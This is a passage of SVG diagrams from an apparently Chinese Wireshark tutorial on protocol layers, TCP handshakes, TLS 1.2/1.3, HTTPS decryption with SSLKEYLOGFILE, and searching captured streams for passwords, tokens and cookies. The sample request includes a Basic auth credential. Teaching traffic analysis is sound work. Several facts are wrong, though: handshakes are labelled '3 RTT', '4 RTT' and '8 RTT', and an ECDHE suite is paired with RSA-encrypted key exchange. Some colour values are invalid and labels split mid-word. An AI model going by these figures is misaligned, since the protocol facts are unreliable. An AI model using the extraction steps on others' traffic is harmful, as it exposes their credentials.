font-family="Microsoft YaHei,Arial">应用层 L7 HTT</text>  <text x="178" y="165" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">/TLS/DNS Payload</text>  <line x1="280" y1="180" x2="280" y2="188" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="280.0" y="180.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">封装 +</text>  <rect x="50" y="188" width="460" height="40" rx="8" fill="#0f172a" stroke="#ec4899"/>  <rect x="50" y="188" width="120" height="40" rx="8" fill="#ec4899" opacity="0.22"/>  <text x="110" y="213" text-anchor="middle" font-size="10.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">传输层 L4 TCP</text>  <text x="178" y="213" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">头 (20B) +  Payload</text>  <line x1="280" y1="228" x2="280" y2="236" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="280.0" y="228.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">封装 +</text>  <rect x="50" y="236" width="460" height="40" rx="8" fill="#0f172a" stroke="#10b981"/>  <rect x="50" y="236" width="120" height="40" rx="8" fill="#10b981" opacity="0.22"/>  <text x="110" y="261" text-anchor="middle" font-size="10.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">网络层 L3 IPv</text>  <text x="178" y="261" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial"> 头 (20B) + TCP + Payload</text>  <line x1="280" y1="276" x2="280" y2="284" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="280.0" y="276.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">封装 +</text>  <rect x="50" y="284" width="460" height="40" rx="8" fill="#0f172a" stroke="#f59e0b"/>  <rect x="50" y="284" width="120" height="40" rx="8" fill="#f59e0b" opacity="0.22"/>  <text x="110" y="309" text-anchor="middle" font-size="10.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">数据链路 L2 Et</text>  <text x="178" y="309" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ernet 头 (14B) + IP + TCP + Payload</text>  <line x1="280" y1="324" x2="280" y2="332" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="280.0" y="324.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">封装 +</text>  <rect x="50" y="332" width="460" height="40" rx="8" fill="#0f172a" stroke="#cbd5e1"/>  <rect x="50" y="332" width="120" height="40" rx="8" fill="#cbd5e1" opacity="0.22"/>  <text x="110" y="357" text-anchor="middle" font-size="10.5" font-weight="800" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">物理层 Frame </text>  <text x="178" y="357" font-size="10.5" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial"> FCS 校验 (网卡收发)</text>  <rect x="550" y="100" width="500" height="390" rx="14" fill="#0b1530" stroke="#334155"/>  <text x="800" y="125" text-anchor="middle" font-size="13.5" font-weight="800" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">② 6 大协议颜色 + 关键字段 + 显示过滤器字段</text>  <rect x="562" y="140" width="476" height="55" rx="8" fill="#0f172a" stroke="#cbd5e1"/>  <circle cx="578" cy="167" r="9" fill="颜色默认浅灰"/>  <text x="594" y="160" font-size="10.5" font-weight="800" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">Frame(物理帧) · L1-L2</text>  <text x="594" y="180" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Arial">60B~1514B · FCS 校验</text>  <text x="900" y="180" text-anchor="end" font-size="9.6" fill="#fde68a" font-family="Consolas,Arial">过滤器: len/time/src/dst/Protocol 元信息</text>  <rect x="562" y="200" width="476" height="55" rx="8" fill="#0f172a" stroke="#f59e0b"/>  <circle cx="578" cy="227" r="9" fill="颜色默认金色"/>  <text x="594" y="220" font-size="10.5" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">Ethernet II · L2</text>  <text x="594" y="240" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Arial">DMAC(6B)+SMAC(6B)+Type(0x0800=IP)</text>  <text x="900" y="240" text-anchor="end" font-size="9.6" fill="#fde68a" font-family="Consolas,Arial">过滤器: ether dst/src/type 过滤</text>  <rect x="562" y="260" width="476" height="55" rx="8" fill="#0f172a" stroke="#10b981"/>  <circle cx="578" cy="287" r="9" fill="颜色默认绿色"/>  <text x="594" y="280" font-size="10.5" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">IPv4 / IPv6 · L3</text>  <text x="594" y="300" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Arial">TTL/Protocol(6=TCP/17=UDP)/Src/Dst IP</text>  <text x="900" y="300" text-anchor="end" font-size="9.6" fill="#fde68a" font-family="Consolas,Arial">过滤器: ip.addr/ip.ttl/ip.proto</text>  <rect x="562" y="320" width="476" height="55" rx="8" fill="#0f172a" stroke="#ec4899"/>  <circle cx="578" cy="347" r="9" fill="颜色默认品红"/>  <text x="594" y="340" font-size="10.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">TCP · L4</text>  <text x="594" y="360" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Arial">SrcPort+DstPort+SEQ+ACK+Flags(SYN/ACK/FIN/RST)/W</text>  <text x="900" y="360" text-anchor="end" font-size="9.6" fill="#fde68a" font-family="Consolas,Arial">过滤器: tcp.port/flags.seq/win</text>  <rect x="562" y="380" width="476" height="55" rx="8" fill="#0f172a" stroke="#0ea5e9"/>  <circle cx="578" cy="407" r="9" fill="颜色默认浅蓝"/>  <text x="594" y="400" font-size="10.5" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">UDP · L4</text>  <text x="594" y="420" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Arial">SrcPort+DstPort+Len+Checksum 8B 极简头</text>  <text x="900" y="420" text-anchor="end" font-size="9.6" fill="#fde68a" font-family="Consolas,Arial">过滤器: udp.port == 53 (DNS)</text>  <rect x="562" y="440" width="476" height="55" rx="8" fill="#0f172a" stroke="#a855f7"/>  <circle cx="578" cy="467" r="9" fill="颜色默认青/紫/橙"/>  <text x="594" y="460" font-size="10.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">HTTP/TLS/DNS · L7</text>  <text x="594" y="480" font-size="9.6" fill="#e2e8f0" font-family="Consolas,Arial">HTTP GET/POST · TLS ClientHello · DNS Query</text>  <text x="900" y="480" text-anchor="end" font-size="9.6" fill="#fde68a" font-family="Consolas,Arial">过滤器: http.host/tls.sni/dns.qry</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">记忆技巧：点开协议树=点 + 展开 Ethernet → IPv4 → TCP → HTTP=洋葱剥皮一样 层层看字段</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="1080" height="560" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s11" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s11" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs11" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs11"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s11)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s11)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs11)">图 5-11 TCP 三次握手 + 四次挥手 + 序号 SEQ/ACK 推导全过程（最重点图）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">新手必须背下来：SYN → SYN+ACK → ACK=三次握手  ；FIN → ACK → FIN → ACK=四次挥手；SEQ/ACK 规律=收到多少字节 ACK+=多少</text>  <line x1="180" y1="115" x2="180" y2="460" stroke="#0ea5e9" stroke-width="2"/>  <line x1="900" y1="115" x2="900" y2="460" stroke="#ef4444" stroke-width="2"/>  <circle cx="180" cy="107" r="16" fill="#0ea5e9" opacity="0.22"/><circle cx="180" cy="107" r="10" fill="#0ea5e9"/>  <text x="180" y="110" text-anchor="middle" font-size="12" font-weight="800" fill="#fff" font-family="Microsoft YaHei,Arial">客户端 Client</text>  <circle cx="900" cy="107" r="16" fill="#ef4444" opacity="0.22"/><circle cx="900" cy="107" r="10" fill="#ef4444"/>  <text x="900" y="110" text-anchor="middle" font-size="12" font-weight="800" fill="#fff" font-family="Microsoft YaHei,Arial">服务端 Server</text>  <text x="180" y="133" text-anchor="middle" font-size="10" fill="#93c5fd" font-family="Consolas">CLOSED → SYN_SENT</text>  <text x="900" y="133" text-anchor="middle" font-size="10" fill="#fca5a5" font-family="Consolas">LISTEN 监听</text>  <text x="540" y="108" text-anchor="middle" font-size="14" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">【上半部：TCP 三次握手】建立连接 (3 RTT)</text>  <line x1="194" y1="138" x2="886" y2="138" stroke="#0ea5e9" stroke-width="2.4" marker-end="url(#arr)"/>  <text x="540" y="134" text-anchor="middle" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① SYN · C→S · SYN_SENT →</text>  <text x="540" y="152" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">SEQ=x=100  Flags=SYN</text>  <line x1="886" y1="196" x2="194" y2="196" stroke="#ef4444" stroke-width="2.4" marker-end="url(#arr)"/>  <text x="540" y="192" text-anchor="middle" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">② SYN + ACK · S→C · ← SYN-RECV</text>  <text x="540" y="210" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">SEQ=y=5000 ACK=x+1=101  Flags=SYN,ACK</text>  <line x1="194" y1="254" x2="886" y2="254" stroke="#10b981" stroke-width="2.4" marker-end="url(#arr)"/>  <text x="540" y="250" text-anchor="middle" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">③ ACK · C→S · → ESTABLISHED</text>  <text x="540" y="268" text-anchor="middle" font-size="10" fill="#e2e8f0" font-family="Consolas,Arial">SEQ=101 ACK=y+1=5001  Flags=ACK</text>  <line x1="60" y1="300" x2="1020" y2="300" stroke="#334155" stroke-dasharray="5 4"/>  <text x="540" y="320" text-anchor="middle" font-size="14" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">【下半部：TCP 四次挥手】断开连接 (4 RTT)</text>  <line x1="194" y1="346" x2="886" y2="346" stroke="#f59e0b" stroke-width="2.4" marker-end="url(#arr)"/>  <text x="540" y="342" text-anchor="middle" font-size="11" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">① FIN (客户端主动关) · C→S · FIN_WAIT_1 →</text>  <text x="540" y="360" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">SEQ=2000 ACK=8000 Flags=FIN,ACK</text>  <line x1="886" y1="384" x2="194" y2="384" stroke="#a855f7" stroke-width="2.4" marker-end="url(#arr)"/>  <text x="540" y="380" text-anchor="middle" font-size="11" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">② ACK · S→C · ← CLOSE_WAIT</text>  <text x="540" y="398" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">SEQ=8000 ACK=2001 Flags=ACK</text>  <line x1="886" y1="422" x2="194" y2="422" stroke="#ec4899" stroke-width="2.4" marker-end="url(#arr)"/>  <text x="540" y="418" text-anchor="middle" font-size="11" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">③ FIN (服务端也关完) · S→C · ← LAST_ACK</text>  <text x="540" y="436" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">SEQ=9000 ACK=2001 Flags=FIN,ACK</text>  <line x1="194" y1="460" x2="886" y2="460" stroke="#06b6d4" stroke-width="2.4" marker-end="url(#arr)"/>  <text x="540" y="456" text-anchor="middle" font-size="11" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">④ ACK → TIME_WAIT 2MSL · C→S · → TIME_WAIT → CLOSED</text>  <text x="540" y="474" text-anchor="middle" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Arial">SEQ=2001 ACK=9001 Flags=ACK</text>  <rect x="30" y="484" width="1020" height="40" rx="8" fill="#020617" stroke="#6366f1"/>  <text x="540" y="500" text-anchor="middle" font-size="11.5" fill="#bfdbfe" font-family="Consolas,Microsoft YaHei,Arial">✅ SEQ/ACK 黄金公式：ACK(确认号) = 上次收到的 SEQ + 上次收到的字节数 PayloadLen · 无 Payload=SYN/FIN 也占 1 个序号！SYN=+1 FIN=+1</text>  <text x="540" y="516" text-anchor="middle" font-size="11" fill="#cbd5e1" font-family="Consolas,Microsoft YaHei,Arial">显示过滤器：tcp.flags.syn==1 握手指纹；tcp.flags.fin==1 断开；tcp.connection.sack 丢包；tcp.analysis.retransmission 重传包</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="1080" height="540" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s12" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s12" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs12" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs12"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s12)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s12)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs12)">图 5-12 TLS 1.2 (8 RTT) vs TLS 1.3 (2 RTT/1 RTT) 握手流程对比</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">TLS 1.3=砍掉 RSA/压缩/大量扩展 → 8 包变 3 包 → HTTPS 快 30%+；HTTPS 解密=浏览器导出 SSLKEYLOGFILE 给 Wireshark</text>  <line x1="120" y1="115" x2="120" y2="380" stroke="#0ea5e9" stroke-width="1.8"/>  <line x1="420" y1="115" x2="420" y2="380" stroke="#ef4444" stroke-width="1.8"/>  <text x="120" y="111" text-anchor="middle" font-size="11" font-weight="800" fill="#0ea5e9">Client</text>  <text x="420" y="111" text-anchor="middle" font-size="11" font-weight="800" fill="#ef4444">Server</text>  <text x="270.0" y="100" text-anchor="middle" font-size="14" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">TLS 1.2 完整握手（8 条报文=慢）</text>  <line x1="128" y1="135" x2="412" y2="135" stroke="#0ea5e9" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="133" text-anchor="middle" font-size="9.2" font-weight="800" fill="#0ea5e9">① ClientHello</text>  <text x="270.0" y="146" text-anchor="middle" font-size="8.4" fill="#cbd5e1">TLS 1.2 + Cipher Suites + SNI</text>  <line x1="412" y1="165" x2="128" y2="165" stroke="#ef4444" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="163" text-anchor="middle" font-size="9.2" font-weight="800" fill="#ef4444">② ServerHello</text>  <text x="270.0" y="176" text-anchor="middle" font-size="8.4" fill="#cbd5e1">选 TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</text>  <line x1="412" y1="195" x2="128" y2="195" stroke="#f59e0b" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="193" text-anchor="middle" font-size="9.2" font-weight="800" fill="#f59e0b">③ Certificate</text>  <text x="270.0" y="206" text-anchor="middle" font-size="8.4" fill="#cbd5e1">.crt 证书链（含公钥 RSA-2048）</text>  <line x1="412" y1="225" x2="128" y2="225" stroke="#ec4899" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="223" text-anchor="middle" font-size="9.2" font-weight="800" fill="#ec4899">④ ServerKeyExchange</text>  <text x="270.0" y="236" text-anchor="middle" font-size="8.4" fill="#cbd5e1">ECDHE 临时公钥参数（PFS）</text>  <line x1="412" y1="255" x2="128" y2="255" stroke="#8b5cf6" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="253" text-anchor="middle" font-size="9.2" font-weight="800" fill="#8b5cf6">⑤ ServerHelloDone</text>  <text x="270.0" y="266" text-anchor="middle" font-size="8.4" fill="#cbd5e1">服务端握手消息发完了</text>  <line x1="128" y1="285" x2="412" y2="285" stroke="#0ea5e9" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="283" text-anchor="middle" font-size="9.2" font-weight="800" fill="#0ea5e9">⑥ ClientKeyExchange</text>  <text x="270.0" y="296" text-anchor="middle" font-size="8.4" fill="#cbd5e1">客户端用 RSA 加密 Pre-Master Secret</text>  <line x1="128" y1="315" x2="412" y2="315" stroke="#10b981" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="313" text-anchor="middle" font-size="9.2" font-weight="800" fill="#10b981">⑦ ChangeCipherSpec + Finished</text>  <text x="270.0" y="326" text-anchor="middle" font-size="8.4" fill="#cbd5e1">告诉对方 后续都是加密消息</text>  <line x1="412" y1="345" x2="128" y2="345" stroke="#10b981" stroke-width="1.6" marker-end="url(#arr)"/>  <text x="270.0" y="343" text-anchor="middle" font-size="9.2" font-weight="800" fill="#10b981">⑧ ChangeCipherSpec + Finished</text>  <text x="270.0" y="356" text-anchor="middle" font-size="8.4" fill="#cbd5e1">服务端也切换加密模式=握手完成</text>  <line x1="650" y1="115" x2="650" y2="380" stroke="#0ea5e9" stroke-width="1.8"/>  <line x1="950" y1="115" x2="950" y2="380" stroke="#ef4444" stroke-width="1.8"/>  <text x="650" y="111" text-anchor="middle" font-size="11" font-weight="800" fill="#0ea5e9">Client</text>  <text x="950" y="111" text-anchor="middle" font-size="11" font-weight="800" fill="#ef4444">Server</text>  <text x="800.0" y="100" text-anchor="middle" font-size="14" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">TLS 1.3 握手（3 条报文=快！）</text>  <line x1="658" y1="165" x2="942" y2="165" stroke="#0ea5e9" stroke-width="2" marker-end="url(#arr)"/>  <text x="800.0" y="161" text-anchor="middle" font-size="10.5" font-weight="800" fill="#0ea5e9">① ClientHello + Key Share</text>  <text x="800.0" y="179" text-anchor="middle" font-size="9" fill="#cbd5e1">内带 ECDHE 公钥 + 仅支持 5 个安全 Cipher</text>  <line x1="942" y1="255" x2="658" y2="255" stroke="#ef4444" stroke-width="2" marker-end="url(#arr)"/>  <text x="800.0" y="251" text-anchor="middle" font-size="10.5" font-weight="800" fill="#ef4444">② ServerHello + Key Share + Certificate + Finished</text>  <text x="800.0" y="269" text-anchor="middle" font-size="9" fill="#cbd5e1">1 条包含：选算法+临时公钥+证书链+加密Finished</text>  <line x1="658" y1="345" x2="942" y2="345" stroke="#10b981" stroke-width="2" marker-end="url(#arr)"/>  <text x="800.0" y="341" text-anchor="middle" font-size="10.5" font-weight="800" fill="#10b981">③ Finished (Encrypted Extension)</text>  <text x="800.0" y="359" text-anchor="middle" font-size="9" fill="#cbd5e1">客户端也发 Finished → 立即发应用数据 (HTTP GET)</text>  <rect x="30" y="400" width="1020" height="110" rx="12" fill="#020617" stroke="#a855f7"/>  <text x="540" y="422" text-anchor="middle" font-size="13" font-weight="800" fill="#c4b5fd" font-family="Microsoft YaHei,Arial">HTTPS 解密= 3 步搞定（CTF/实战 100% 要用到）</text>  <rect x="42" y="432" width="996" height="30" rx="6" fill="#0f172a" stroke="#8b5cf6"/>  <text x="52" y="452" font-size="10.5" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">Step1 浏览器导 KeyLog</text>  <text x="220" y="452" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Chrome/Edge: set SSLKEYLOGFILE=C:\ssl.log → 重启浏览器 → 访问 HTTPS=自动写 key log</text>  <rect x="42" y="466" width="996" height="30" rx="6" fill="#0f172a" stroke="#a855f7"/>  <text x="52" y="486" font-size="10.5" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">Step2 Wireshark 配路径</text>  <text x="220" y="486" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Edit→Preferences→Protocols→TLS→(Pre)-Master-Secret log filename 选 C:\ssl.log</text>  <rect x="42" y="500" width="996" height="30" rx="6" fill="#0f172a" stroke="#ec4899"/>  <text x="52" y="520" font-size="10.5" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">Step3 看明文 HTTP</text>  <text x="220" y="520" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">原本 TLSv1.2 Application Data=自动解析成 HTTP/2 明文，Follow Stream 看请求响应</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="1080" height="540" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s13" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s13" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs13" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs13"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s13)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s13)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs13)">图 5-13 HTTP 请求 + 响应 + Follow Stream 流还原 5 步全流程</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">HTTP=明文最容易分析 → Follow TCP Stream=Wireshark 最强大功能 100% 必用 → 直接把一次会话所有字节按顺序拼好显示</text>  <rect x="30" y="110" width="200" height="220" rx="12" fill="#0b1530" stroke="#0ea5e9" filter="url(#sh)"/>  <rect x="30" y="110" width="200" height="30" rx="12" fill="#0ea5e9" opacity="0.18"/>  <rect x="30" y="110" width="200" height="30" rx="12" fill="none" stroke="#0ea5e9"/>  <text x="44" y="130" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① 抓 HTTP 流量</text>  <text x="44" y="158" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">Capture: tcp port 80\n访问 http://example.com/path?a=1\n</text>  <line x1="230" y1="220" x2="236" y2="220" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="233.0" y="216.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">1→2</text>  <rect x="236" y="110" width="200" height="220" rx="12" fill="#0b1530" stroke="#10b981" filter="url(#sh)"/>  <rect x="236" y="110" width="200" height="30" rx="12" fill="#10b981" opacity="0.18"/>  <rect x="236" y="110" width="200" height="30" rx="12" fill="none" stroke="#10b981"/>  <text x="250" y="130" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② 选中 1 个请求</text>  <text x="250" y="158" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">点击 No.=1 行（GET /path）\n中间面板展开 Hypertext Transfer Proto</text>  <line x1="436" y1="220" x2="442" y2="220" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="439.0" y="216.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">2→3</text>  <rect x="442" y="110" width="200" height="220" rx="12" fill="#0b1530" stroke="#8b5cf6" filter="url(#sh)"/>  <rect x="442" y="110" width="200" height="30" rx="12" fill="#8b5cf6" opacity="0.18"/>  <rect x="442" y="110" width="200" height="30" rx="12" fill="none" stroke="#8b5cf6"/>  <text x="456" y="130" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ Follow TCP Stream</text>  <text x="456" y="158" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">右键包 → Follow → TCP Stream\nWireshark 自动按 tcp.stream 过滤</text>  <line x1="642" y1="220" x2="648" y2="220" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="645.0" y="216.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">3→4</text>  <rect x="648" y="110" width="200" height="220" rx="12" fill="#0b1530" stroke="#f59e0b" filter="url(#sh)"/>  <rect x="648" y="110" width="200" height="30" rx="12" fill="#f59e0b" opacity="0.18"/>  <rect x="648" y="110" width="200" height="30" rx="12" fill="none" stroke="#f59e0b"/>  <text x="662" y="130" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">④ 保存/导出</text>  <text x="662" y="158" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">流窗口里：Save as 存成文件\n另：File → Export Objects → HTTP\n所有 </text>  <line x1="848" y1="220" x2="854" y2="220" stroke="#60a5fa" stroke-width="2" marker-end="url(#arr)"/>  <text x="851.0" y="216.0" text-anchor="middle" font-size="10" fill="#60a5fa" font-family="Consolas,Arial">4→5</text>  <rect x="854" y="110" width="200" height="220" rx="12" fill="#0b1530" stroke="#ef4444" filter="url(#sh)"/>  <rect x="854" y="110" width="200" height="30" rx="12" fill="#ef4444" opacity="0.18"/>  <rect x="854" y="110" width="200" height="30" rx="12" fill="none" stroke="#ef4444"/>  <text x="868" y="130" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ 提取敏感数据</text>  <text x="868" y="158" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">搜索 stream 中 passwd / token / cookie\n显示过滤器: frame cont</text>  <rect x="30" y="350" width="500" height="170" rx="10" fill="#000000" stroke="#0ea5e9"/>  <text x="280" y="370" text-anchor="middle" font-size="12" font-weight="800" fill="#93c5fd" font-family="Consolas,Arial">📤 HTTP 请求（红色=客户端发送）</text>  <text x="42" y="394" font-size="10" fill="#fca5a5" font-family="Consolas,Arial">GET /login?next=/admin HTTP/1.1</text>  <text x="42" y="411" font-size="10" fill="#fca5a5" font-family="Consolas,Arial">Host: www.example.com</text>  <text x="42" y="428" font-size="10" fill="#fca5a5" font-family="Consolas,Arial">User-Agent: Mozilla/5.0 (Windows NT 10.0) Chrome/120</text>  <text x="42" y="445" font-size="10" fill="#fca5a5" font-family="Consolas,Arial">Cookie: sessionid=abc123def; lang=zh</text>  <text x="42" y="462" font-size="10" fill="#fca5a5" font-family="Consolas,Arial">Accept: text/html,application/xhtml+xml</text>  <text x="42" y="479" font-size="10" fill="#fca5a5" font-family="Consolas,Arial">Connection: keep-alive</text>  <text x="42" y="496" font-size="10" fill="#fca5a5" font-family="Consolas,Arial">Authorization: Basic YWRtaW46YWRtaW4xMjM=</text>  <rect x="550" y="350" width="500" height="170" rx="10" fill="#000000" stroke="#10b981"/>  <text x="800" y="370" text-anchor="middle" font-size="12" font-weight="800" fill="#34d399" font-family="Consolas,Arial">📥 HTTP 响应（蓝色=服务端回复）</text>  <text x="562" y="394" font-size="10" fill="#7dd3fc" font-family="Consolas,Arial">HTTP/1.1 302 Found</text>  <text x="562" y="411" font-size="10" fill="#7dd3fc" font-family="Consolas,Arial">Date: Mon, 18 Mar 2026 06:00:00 GMT</text>  <text x="562" y="428" font-size="10" fill="#7dd3fc" font-family="Consolas,Arial">Server: nginx/1.24</text>  <text x="562" y="445" font-size="10" fill="#7dd3fc" font-family="Consolas,Arial">Set-Cookie: PHPSESSID=deadbeef1234abcd;</text>  <text x="562" y="462" font-size="10" fill="#7dd3fc" font-family="Consolas,Arial">Set-Cookie: admin_token=eyJhbGciOiJIUzI1NiJ9.e30.ABC;</text>  <text x="562" y="479" font-size="10" fill="#7dd3fc" 